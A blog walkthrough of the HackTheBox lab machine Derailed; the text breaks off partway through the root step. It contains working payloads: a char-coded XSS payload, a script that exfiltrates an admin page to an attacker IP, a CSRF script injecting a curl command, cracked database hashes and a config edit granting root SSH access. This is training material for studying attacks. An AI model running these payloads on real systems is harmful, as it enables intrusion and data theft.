---
layout: post
title: HackTheBox-Derailed Walkthrough
date: 2023-07-20 07:00:00 -500
categories: [HackTheBox Walkthrough]
tags: [HackTheBox]
image:
  path: /assets/img/headers/Derailed.webp
---

***
### **<strong><font color="DarkCyan">Box Info</font></strong>**

<center><strong><font color="DarkGray">Derailed is an incredibly challenging Linux machine that focuses on exploiting web vulnerabilities, including Stored Cross-Site Scripting, Session Riding, Arbitrary File Inclusion, and command injection in a Rails application.

The initial exploit involves a buffer overflow vulnerability in a WebAssembly function. This allows the attacker to inject an XSS payload into a secondary parameter, gaining access to a vulnerable administrative page. From there, the attacker can retrieve arbitrary system files, and with further exploration, they can discover a command injection vulnerability, which eventually leads to Remote Command Execution.

The attack progresses as follows: through password re-use, the attacker gains access to an openmediavault user who possesses the necessary privileges to install .deb packages. The attacker then calls a specific function from an RPC endpoint, ultimately achieving the escalation of privileges and gaining the ability to execute arbitrary code during the post-installation step.</font></strong></center>

***
## **<strong><font color="Brown">Recon</font></strong>**


### **<strong><font color="DarkCyan">Nmap</font></strong>**

```nmap``` found two open TCP ports, SSH (22) and HTTP (3000):

```bash
nmap 10.10.11.190 -p 3000,22 -sCV 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-20 11:34 EDT
Nmap scan report for 10.10.11.190
Host is up (0.58s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 16:23:b0:9a:de:0e:34:92:cb:2b:18:17:0f:f2:7b:1a (RSA)
|   256 50:44:5e:88:6b:3e:4b:5b:f9:34:1d:ed:e5:2d:91:df (ECDSA)
|_  256 0a:bd:92:23:df:44:02:6f:27:8d:a6:ab:b4:07:78:37 (ED25519)
3000/tcp open  http    nginx 1.18.0
|_http-title: derailed.htb
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.43 seconds

```

### **<strong><font color="DarkCyan">Website - TCP 3000</font></strong>**


![](/assets/img/posts/htb-derailed/1.png)

There wasn't much to explore initially since we didn't have any credentials yet. To start off, I performed a directory scan to discover potential endpoints. Luckily, I came across an interesting endpoint at /rails using dirsearch

```bash
dirsearch -u http://10.10.11.190:3000/ -x 404

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_10.10.11.190_3000/__23-07-20_12-06-44.txt

Target: http://10.10.11.190:3000/

[12:06:44] Starting: 
<snippet>
[12:09:26] 200 -    2KB - /rails/info/properties
[12:09:28] 200 -   99B  - /robots.txt
<snippet>


Task Completed

```

Indeed, the discovery of the ```/rails``` endpoint provided a wealth of information, indicating that the project is built on Ruby on Rails. Additionally, I encountered another intriguing directory, the ```/administration``` panel, but unfortunately, I couldn't access its contents. Here's the information retrieved from the info endpoint:

> ```/rails/info/properties```

```bash
Rails version	6.1.6
Ruby version	ruby 2.7.2p137 (2020-10-01 revision 5445e04352) [x86_64-linux]
RubyGems version	3.1.4
Rack version	2.2.3
Middleware	

    Webpacker::DevServerProxy
    ActionDispatch::HostAuthorization
    Rack::Sendfile
    ActionDispatch::Static
    ActionDispatch::Executor
    ActiveSupport::Cache::Strategy::LocalCache::Middleware
    Rack::Runtime
    Rack::MethodOverride
    ActionDispatch::RequestId
    ActionDispatch::RemoteIp
    Sprockets::Rails::QuietAssets
    Rails::Rack::Logger
    ActionDispatch::ShowExceptions
    ActionDispatch::ActionableExceptions
    ActionDispatch::Reloader
    ActionDispatch::Callbacks
    ActiveRecord::Migration::CheckPending
    ActionDispatch::Cookies
    ActionDispatch::Session::CookieStore
    ActionDispatch::Flash
    ActionDispatch::ContentSecurityPolicy::Middleware
    ActionDispatch::PermissionsPolicy::Middleware
    Rack::Head
    Rack::ConditionalGet
    Rack::ETag
    Rack::TempfileReaper

Application root	/var/www/rails-app
Environment	development
Database adapter	sqlite3
Database schema version	20220529182601
```

With this information in hand, we can now proceed to fuzz out other details and endpoints within the /rails directory. To achieve this, I leveraged feroxbuster due to its handy recursive search function.


This directory essentially revealed every single path available on the website:

![](/assets/img/posts/htb-derailed/2.png)

```bash
feroxbuster -u http://10.10.11.190:3000/rails/info/          

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.190:3000/rails/info/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        9c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        1l        5w      108c http://10.10.11.190:3000/rails/info/ => http://10.10.11.190:3000/rails/info/routes
200      GET       36l      102w     2294c http://10.10.11.190:3000/rails/info/properties
200      GET     1045l     1666w    25576c http://10.10.11.190:3000/rails/info/routes
```



> ```/clipnotes```

Earlier, we encountered a clipnote function, and upon testing it, we noticed that every time we create a new clipnote, it gets stored on the server. The clipnote I created in this instance has the identifier "115".

![](/assets/img/posts/htb-derailed/3.png)

By utilizing the ```/clipnotes/raw/:id``` format, I successfully accessed the first clipnote, which was submitted by a user named Alice. However, attempting to view any other clipnotes beyond the first one (e.g., ID other than 1) proved to be infeasible.

![](/assets/img/posts/htb-derailed/4.png)

Curiosity led me to explore the existence of other clipnote numbers, so I employed ```wfuzz``` to enumerate and check for any additional numbers. The enumeration process revealed that no other clipnote numbers are present on the server; only the initial one (ID 1) submitted by Alice is available.

```bash
 wfuzz -z range,0-150 --hc=404 http://10.10.11.190:3000/clipnotes/raw/FUZZ 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.190:3000/clipnotes/raw/FUZZ
Total requests: 151

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000000002:   200        0 L      6 W        145 Ch      "1"                                                                                                    
000000115:   200        0 L      2 W        245 Ch      "114"                                                                                                  
000000114:   200        0 L      2 W        240 Ch      "113"                                                                                                  
000000116:   200        0 L      3 W        133 Ch      "115"                                                                                                  
000000112:   200        0 L      1 W        210 Ch      "111"                                                                                                  
000000113:   200        0 L      1 W        250 Ch      "112"                                                                                                  
000000111:   200        0 L      1 W        218 Ch      "110"                                                                                                  
000000110:   200        0 L      1 W        216 Ch      "109"
```

With a keen eye, I investigated the other endpoints, hoping to discover more intriguing paths. The ```/report``` endpoint caught my attention as it seemed promising and worth exploring further.

![](/assets/img/posts/htb-derailed/5.png)


When I submitted a report, the response indicated that an admin would review it. This suggests that there might be a possibility of an ```XSS (Cross-Site Scripting)``` vulnerability on the website.

Upon inspecting the POST request for the report submission, I noticed the presence of an authenticity_token being sent along with the request. This token is commonly used to prevent ```CSRF (Cross-Site Request Forgery)``` attacks and plays a role in ensuring the security of the website.

![](/assets/img/posts/htb-derailed/6.png)

Unfortunately, the cookies are set to ```HttpOnly```, which makes stealing them pointless in this case. However, an ```XSS``` vulnerability on the administrator's account could still provide valuable information about the ```/administration``` page or allow us to impersonate the administrator by stealing their cookie.

Given that this challenge appears to be focused on ```XSS```, my initial approach was to search for a potential entry point for ```XSS```.

### **<strong><font color="DarkCyan">Finding XSS Point</font></strong>**


I played around with the clipnotes extensively, trying various approaches to load JavaScript, but it didn't work. Then it dawned on me that I could potentially exploit the fact that I controlled the ```author``` field in the clipnotes. My idea was to overflow the system or attempt to register a malicious user. Considering that the page renders the username, there might be a vulnerability here.

To proceed, I set up an HTTP server and started my attempt:

![](/assets/img/posts/htb-derailed/7.png)


I created the clipnote with an eye on the potential limit to the username. I speculated that attempting to overflow it might cause the end part to be rendered as JavaScript code. With this in mind, I proceeded to craft the clipnote:

![](/assets/img/posts/htb-derailed/8.png)


### **<strong><font color="DarkCyan">CVE-2022-32209 (Ruby + XSS)</font></strong>**


I looked up information about Ruby XSS CVEs, and one particular vulnerability caught my interest: CVE-2022-32209, which involves an XSS exploit for Rails::Html::Sanitizer.

You can find more details about it here: [```CVE-2022-32209 Exploit```](https://groups.google.com/g/rubyonrails-security/c/ce9PhUANQ6s?pli=1).

Considering the potential impact of this exploit, I suspected it might be relevant to the challenge. Thus, I attempted to apply a similar overflow technique using the ```select``` tag as a payload:

```bash
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://10.10.14.14/xss_callback'>
```

![](/assets/img/posts/htb-derailed/9.png)

Great to hear that it worked! Now, we should focus on getting a callback. Once we achieve that, we can explore potential ways to exploit this ```XSS``` vulnerability.

### **<strong><font color="DarkCyan">XSS for /administrator</font></strong>**


Now that we've identified the ```XSS``` vulnerability, my suggestion is to consider using **CSRF (Cross-Site Request Forgery)** to gather more information about the ```/administration``` page. CSRF tokens alone don't safeguard against ```XSS``` attacks, and since we found a simple Rails cookie that was HttpOnly, we need to find an alternative approach for exploiting the ```XSS```.

Given that we can execute basic web requests using our username, the next step is to figure out how to redirect the user to a specific location. We can exploit the eval function to inject malicious JavaScript code.

To begin, I created a basic script that will callback to our machine. From here, we can proceed with implementing the ```CSRF``` strategy and crafting the necessary malicious ```JavaScript``` code for our exploit.

```javascript
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", "http://10.10.14.199/stringcallback", false);
xmlHttp.send(null);
```
I attempted Base64 encoding initially, but unfortunately, it didn't yield the desired results. Instead, I switched to Char Coding, which involves translating all the characters within my script into their corresponding ASCII letters. 
i use this site for encoding : [```Character Code Finder```](https://www.mauvecloud.net/charsets/CharCodeFinder.html)


The payload becomes this:

```bash
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://10.10.14.199/EmSec_image' onerror="eval(String.fromCharCode(118, 97, 114, 32, 120, 109, 108, 72, 116, 116, 112, 32, 61, 32, 110, 101, 119, 32, 88, 77, 76, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116, 40, 41, 59, 10, 120, 109, 108, 72, 116, 116, 112, 46, 111, 112, 101, 110, 40, 34, 71, 69, 84, 34, 44, 32, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 49, 57, 57, 47, 115, 116, 114, 105, 110, 103, 99, 97, 108, 108, 98, 97, 99, 107, 34, 44, 32, 102, 97, 108, 115, 101, 41, 59, 10, 120, 109, 108, 72, 116, 116, 112, 46, 115, 101, 110, 100, 40, 110, 117, 108, 108, 41, 59))">
```

This payload worked! I was able to retrieve two callbacks after creating the clipnote.

![](/assets/img/posts/htb-derailed/10.png)

Now we can use a script from [```Hacktricks```](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#steal-page-content) to retrieve the page content of the administration panel.

```javascript
var url = "http://derailed.htb:3000/administration";
var attacker = "http://10.10.14.29/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);
```

Then, we can send it via the same method and make sure to report the clipnote to make the administrator load the page.

After a maximum of 1 minute, you will receive the content from your http.server. Then, decode the base64-encoded content.

![](/assets/img/posts/htb-derailed/11.png)

You can use [```CyberChef```](https://gchq.github.io/CyberChef/) to decode the base64 and then use any compiler to view the HTML code that you obtained.

![](/assets/img/posts/htb-derailed/12.png)

HTML compleer : [```programiz```](https://www.programiz.com/html/online-compiler/)

![](/assets/img/posts/htb-derailed/13.png)


This form seems to download something and it has a fixed value. Since this is a POST request, we need to use ```CSRF``` to trick the administrator into sending the request. The 'value' parameter looks suspicious, as it seems to be vulnerable to a Local File Inclusion ```(LFI)``` exploit.

When performing ```CSRF```, our payload should follow these steps:

Retrieve the 'authenticity_token' value, as we need it to verify that we are indeed the administrator.
Send the POST request with an edited ```report_log``` value.
Add a small delay (e.g., 3 seconds) to ensure that the page fully loads before attempting to find the required elements.
I did some research on Ruby vulnerabilities and came across a few informative articles: [```Exploit```](https://bishopfox.com/blog/ruby-vulnerabilities-exploits)

Potentially, this form might be using the ```open``` function, which is vulnerable to Remote Code Execution ```(RCE)``` due to a deserialization exploit. 

***
## **<strong><font color="Brown">Shell as Alice</font></strong>**


To test this hypothesis, I created a quick script:

```javascript
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://derailed.htb:3000/administration", true);
xmlHttp.send( null );

setTimeout(function() {
    var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html');
    var token = doc.getElementById('authenticity_token').value;
    var newForm = new DOMParser().parseFromString('<form id="badform" method="post" action="/administration/reports">    <input type="hidden" name="authenticity_token" id="authenticity_token" value="AUTHENTICITY_TOKEN_HERE" autocomplete="off">    <input id="report_log" type="text" class="form-control" name="report_log" value="REPORT_LOG_HERE" hidden="">    <button name="button" type="submit">Submit</button>', 'text/html');
    document.body.append(newForm.forms.badform);
    document.getElementById('badform').elements.report_log.value = '|curl http://10.10.14.199/rcecfmed';
    document.getElementById('badform').elements.authenticity_token.value = token;
    document.getElementById('badform').submit();
}, 3000);
```

NOTE : In this script, you need to modify the variables ```ip```, ```authenticity_token```, and ```report_log```. You can find these in the administrator content.


When waiting around, I eventually got a callback via the curl command I injected.

![](/assets/img/posts/htb-derailed/14.png)

We can obtain the user flag while we're here.

![](/assets/img/posts/htb-derailed/15.png)

To establish persistence, we can place our public key within the ~/.ssh/authorized_keys folder. 

![](/assets/img/posts/htb-derailed/16.png)

And we are now inside the machine with SSH.

***
## **<strong><font color="Brown">Shell as openmediavault-webgui</font></strong>**


Afterward, I explored the /var/www/ directory to search for some credentials.

> ```/var/www/rails-app/db/```

We discovered a ```sqlite3``` file at this location. Inside the file, there is a section containing hashes related to Toby and aclice.


```bash
rails@derailed:/var/www/rails-app/db$ ls
development.sqlite3  migrate  schema.rb
rails@derailed:/var/www/rails-app/db$ sqlite3 development.sqlite3 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .databases
main: /var/www/rails-app/db/development.sqlite3 r/w
sqlite> .tables
ar_internal_metadata  reports               users               
notes                 schema_migrations   
sqlite> SELECT * FROM users;
1|alice|$2a$12$hkqXQw6n0CxwBxEW/0obHOb.0/Grwie/4z95W3BhoFqpQRKIAxI7.|administrator|2022-05-30 18:02:45.319074|2022-05-30 18:02:45.319074
2|toby|$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv9UKN5RML3sDLuIqNqqimqnZYyle|user|2022-05-30 18:02:45.542476|2022-05-30 18:02:45.542476
105|aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|$2a$12$hSen8wtUb1JdGrAeFHgMAerrv2CZuNvULben7dtCcqcy3s7n0heOq|user|2023-07-21 09:29:11.948646|2023-07-21 09:29:11.948646
106|baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|$2a$12$4vsD/ydljiSQoAOa6Cfl2OVtZtwObbQkNdec/kAdQhBmc/PBu.xIi|user|2023-07-21 09:30:06.472350|2023-07-21 09:30:06.472350
107|aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb<select<style/><img src='http://10.10.14.58/imgfail' onerror="eval(String.fromCharCode(118,97,114,32,120,109,108,72,116,116,112,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,120,109,108,72,116,116,112,46,111,112,101,110,40,32,34,71,69,84,34,44,32,34,104,116,116,112,58,47,47,100,101,114,97,105,108,101,100,46,104,116,98,58,51,48,48,48,47,97,100,109,105,110....<snippet>
```
It's interesting that we found two users in the users table

```bash
1|alice|$2a$12$hkqXQw6n0CxwBxEW/0obHOb.0/Grwie/4z95W3BhoFqpQRKIAxI7
2|toby|$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv9UKN5RML3sDLuIqNqqimqnZYyle
```
Let's check these users from the '/etc/passwd' file.

![](/assets/img/posts/htb-derailed/17.png)

Great! After checking the ```/etc/passwd``` file, we have confirmed that the ```openmediavault-webgui``` user corresponds to Toby Wright.

So let's crack the toby hash and login with openmediavault-webgui user 

```bash
# Use this for crack the Hash
john -w=/usr/share/wordlists/rockyou.txt toby_hash 

# Use this for show the password
john toby_hash --show 
?: greenday

1 password hash cracked, 0 left

```

So the password of openmediavault-webgui user is ```greenday```

With this, we can su to the openmediavault-webgui user.

```bash
rails@derailed:/var/www/rails-app/db$ su openmediavault-webgui
Password:                  
openmediavault-webgui@derailed:/var/www/rails-app/db$ cd /home/openmediavault-webgui/
openmediavault-webgui@derailed:~$ ls
openmediavault-webgui@derailed:~$ ls -la
total 12
drwxr-xr-x 3 openmediavault-webgui openmediavault-webgui 4096 Jul 21 05:42 .
drwxr-xr-x 5 root                  root                  4096 Nov 20  2022 ..
lrwxrwxrwx 1 openmediavault-webgui openmediavault-webgui    9 Nov  4  2022 .bash_history -> /dev/null
drwx------ 2 openmediavault-webgui openmediavault-webgui 4096 Jul 21 06:08 .ssh
openmediavault-webgui@derailed:~$ 
```

### **<strong><font color="DarkCyan">OpenMediaVault</font></strong>**


During my earlier observation, I noticed an OMV (OpenMediaVault) instance running on the machine. Running the ```netstat -lputn``` command further confirms that it is actively listening on port 80

```bash
openmediavault-webgui@derailed:~$ netstat -lputn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:34045         0.0.0.0:*               LISTEN      -                   
tcp        0      0 10.10.11.190:5357       0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3003          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      21455/nc            
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:46795         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::111                  :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::1234                 :::*                    LISTEN      21455/nc            
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:44766           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:55393           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:111             0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
udp        0      0 10.10.11.190:3702       0.0.0.0:*                           -                   
udp        0      0 239.255.255.250:3702    0.0.0.0:*                           -                   
udp6       0      0 :::111                  :::*                                -                   
udp6       0      0 :::5353                 :::*                                -                   
udp6       0      0 ::1:323                 :::*                                -                   
udp6       0      0 :::44613                :::*                                -    
```

We can confirm that there is a site running on port 80 by using the ```curl``` command


```bash
openmediavault-webgui@derailed:~$ curl 127.0.0.1:80
<!DOCTYPE html><html lang="en"><head>
  <meta charset="utf-8">
  <title>openmediavault Workbench</title>
  <base href="/">

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

  <link rel="icon" type="image/x-icon" href="favicon.ico">
  <link rel="apple-touch-icon" href="favicon_180x180.png">
  <link rel="icon" href="favicon.svg" sizes="any" type="image/svg+xml">
<style>@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-cyrillic-ext-400-normal.4543e27a05aa2ba75c44.woff2) format("woff2"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format("woff");unicode-range:u+0460-052f,u+1c80-1c88,u+20b4,u+2de0-2dff,u+a640-a69f,u+fe2e-fe2f}@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-cyrillic-400-normal.514f4123b1effd5ed0d8.woff2) format("woff2"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format("woff");unicode-range:u+0400-045f,u+0490-0491,u+04b0-04b1,u+2116}@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-greek-ext-400-normal.18e3b17c2aceabafdd3c.woff2) format("woff2"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format("woff");unicode-range:u+1f??}@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-greek-400-normal.94fd6d5b2b3cd70f2516.woff2) format("woff2"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format("woff");unicode-range:u+0370-03ff}@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-vietnamese-400-normal.a1bc9a8f426924c5dea8.woff2) format("woff2"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format("woff");unicode-range:u+0102-0103,u+0110-0111,u+0128-0129,u+0168-0169,u+01a0-01a1,u+01af-01b0,u+1ea0-1ef9,u+20ab}@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-latin-ext-400-normal.325ea6d33179f07ec7db.woff2) format("woff2"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format("woff");unicode-range:u+0100-024f,u+0259,u+1e??,u+2020,u+20a0-20ab,u+20ad-20cf,u+2113,u+2c60-2c7f,u+a720-a7ff}@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-latin-400-normal.c96fe5ff771f9e7b53ab.woff2) format("woff2"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format("woff");unicode-range:u+00??,u+0131,u+0152-0153,u+02bb-02bc,u+02c6,u+02da,u+02dc,u+2000-206f,u+2074,u+20ac,u+2122,u+2191,u+2193,u+2212,u+2215,u+feff,u+fffd}@-webkit-keyframes cdk-text-field-autofill-start{}@-webkit-keyframes cdk-text-field-autofill-end{}body,html{height:100%}body{background-color:#85c3ec;font-family:Inter,Roboto,HelveticaNeue,Helvetica Neue,helvetica,arial,sans-serif;margin:0}</style><link rel="stylesheet" href="styles.ec2b7e3a2e7cd4cc5964.css" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="styles.ec2b7e3a2e7cd4cc5964.css"></noscript></head>
<body>
  <omv-root></omv-root>
<script src="runtime-es2017.7fa41b39a73c8bd4a330.js" type="module"></script><script src="runtime-es5.7fa41b39a73c8bd4a330.js" nomodule defer></script><script src="polyfills-es5.a484050d1f8658290636.js" nomodule defer></script><script src="polyfills-es2017.12c375302ac169873745.js" type="module"></script><script src="main-es2017.69a1304dec405ae669ca.js" type="module"></script><script src="main-es5.69a1304dec405ae669ca.js" nomodule defer></script>

```
Also, I saw this config file when re-running LinPEAS.

![](/assets/img/posts/htb-derailed/18.png)

Open Media Vault is a network-attached storage system, and I'm interested in exploring it further. To do so, we can use [```chisel```](https://github.com/jpillora/chisel) to set up port forwarding.


```bash
# on attacker machine
./chisel server --port 1445 --reverse

# on target machine
./chisel client --max-retry-count=1 10.10.15.27:1445 R:80:127.0.0.1:80
```

![](/assets/img/posts/htb-derailed/19.png)

Since I couldn't find the credentials to log in, I wasn't able to exploit it. Let's return to the machine and try to exploit it from the inside

***
## **<strong><font color="Brown">Shell as root </font></strong>**


### **<strong><font color="DarkCyan">OMV Config</font></strong>**


> ```/etc/openmediavault/config.xml```

This website on the OMV website was very helpful: [```[GUIDE] Enable SSH with Public Key Authentication (Securing remote webUI access to OMV)```](https://forum.openmediavault.org/index.php?thread/7822-guide-enable-ssh-with-public-key-authentication-securing-remote-webui-access-to/)


The vulnerability lies in the ownership of the ```config.xml``` file by our current user, which allows us to modify it. This enables us to grant SSH access to any user within the machine using a public key of our choice. To exploit this, we need to edit the ```config.xml``` file on the machine.

Within the machine, there are two entries, one for ```rails``` and one for ```test```. We will edit the ```test``` entry for the root user and generate the required key in the correct format by using ```ssh-keygen -t rsa``` and ```ssh-keygen -e -f ~/.ssh/id_rsa.pub```

keep in mind that we must include the ```sshpubkey``` tag since we are defining a new object. Afterward, we need to restart the ```OMV``` instance to apply the changes from the new config file. From the OMV documentation, we can use the [```omv-confdbadm```](https://docs.openmediavault.org/en/6.x/development/tools/omv_confdbadm.html) file to do so.


```bash
openmediavault-webgui@derailed:~$ ssh-keygen -t rsa; ssh-keygen -e -f ~/.ssh/id_rsa.pub
Generating public/private rsa key pair.
Enter file in which to save the key (/home/openmediavault-webgui/.ssh/id_rsa): 
/home/openmediavault-webgui/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/openmediavault-webgui/.ssh/id_rsa
Your public key has been saved in /home/openmediavault-webgui/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:R6QTaSXzPXQgbEzgpFBrcoAVLmOBc7RgDwYLEICrf5Q openmediavault-webgui@derailed
The key's randomart image is:
+---[RSA 3072]----+
|%Boo=o. *B= o..  |
|Bo=+ o =oB++ .   |
|.+=.o =.+.o o    |
|.. o +   o   .   |
|.    .  S .      |
|.   E    .       |
| . .             |
|  . .            |
|   .             |
+----[SHA256]-----+
---- BEGIN SSH2 PUBLIC KEY ----
Comment: "3072-bit RSA, converted by openmediavault-webgui@derailed fr"
AAAAB3NzaC1yc2EAAAADAQABAAABgQC9ybH1LZ6C9EgbEtyL5DMllTbvdqBeDrdDo6Vvze
rrALONYvojeCXSNe9FQlYbsTsDdUWVTlFkCMKzqc7CL/5XAwPVnmvp6mC8QNgsNU8V6jc+
sqpFG8nNi0LG65e0wHbIoppQDC0/+XGQtwsSMhXrkY+Q4DRp+pZMm/H/NWLe/GdJoX0cx1
U0ANFatLidwFAck0vU3EZWolNp4TxmbCv7qZVNZPqV4+1B/BWjaDkd4qoq5+GtLq9b9fGI
3bUJpoDtY5G9pB42jcdElv+crKen6CHgdzmMy6L6Z0vkB2upv1tTQ4iFuccD5vJ2XhU720
iZG+iuN01meZehPuUr82ufNHHoiBzCIHWJmHxvD+no9UpL6n9J7iQouopvhkloDkvuo62l
HXH3hIbKeUZ9itsTvD90Wg9PIrKGyKWt+E7aGuNq3uumhPrgq4rk+6p/gXJZGpmPThqkx0
cqgZrLl18SDosRJwhoSseXuoYUxwhgGmHIo6JMuH4giY+hMPEIiIU=
---- END SSH2 PUBLIC KEY ----
openmediavault-webgui@derailed:~$ 

```

We can overwrite the config.xml with one crafted with ssh public key ```id_rsa.pub```!
Note that we need to add the tag because we are specifying a new object than we can upload a new xml with the crafted info like root inside test and refresh the config

```bash
<snippet>

        </user>
        <user>
          <uuid>e3f59fea-4be7-4695-b0d5-560f25072d4a</uuid>
          <name>root</name>
          <email></email>
          <disallowusermod>0</disallowusermod>
          <sshpubkeys>
          <sshpubkey>---- BEGIN SSH2 PUBLIC KEY ----
Comment: "3072-bit RSA, converted by openmediavault-webgui@derailed fr"
AAAAB3NzaC1yc2EAAAADAQABAAABgQC9ybH1LZ6C9EgbEtyL5DMllTbvdqBeDrdDo6Vvze
rrALONYvojeCXSNe9FQlYbsTsDdUWVTlFkCMKzqc7CL/5XAwPVnmvp6mC8QNgsNU8V6jc+
sqpFG8nNi0LG65e0wHbIoppQDC0/+XGQtwsSMhXrkY+Q4DRp+pZMm/H/NWLe/GdJoX0cx1
U0ANFatLidwFAck0vU3EZWolNp4TxmbCv7qZVNZPqV4+1B/BWjaDkd4qoq5+GtLq9b9fGI
3bUJpoDtY5G9pB42jcdElv+crKen6CHgdzmMy6L6Z0vkB2upv1tTQ4iFuccD5vJ2XhU720
iZG+iuN01meZehPuUr82ufNHHoiBzCIHWJmHxvD+no9UpL6n9J7iQouopvhkloDkvuo62l
HXH3hIbKeUZ9itsTvD90Wg9PIrKGyKWt+E7aGuNq3uumhPrgq4rk+6p/gXJZGpmPThqkx0
cqgZrLl18SDosRJwhoSseXuoYUxwhgGmHIo6JMuH4giY+hMPEIiIU=
---- END SSH2 PUBLIC KEY ----</sshpubkey>
          </sshpubkeys>
        </user>
      </users>


<snippet>
```

> ```/usr/sbin```

The ```/usr/sbin``` file contains loads of ```omv``` related tools too:

```bash
openmediavault-webgui@derailed:/usr/sbin$ ./omv-confdbadm read conf.system.usermngmnt.user
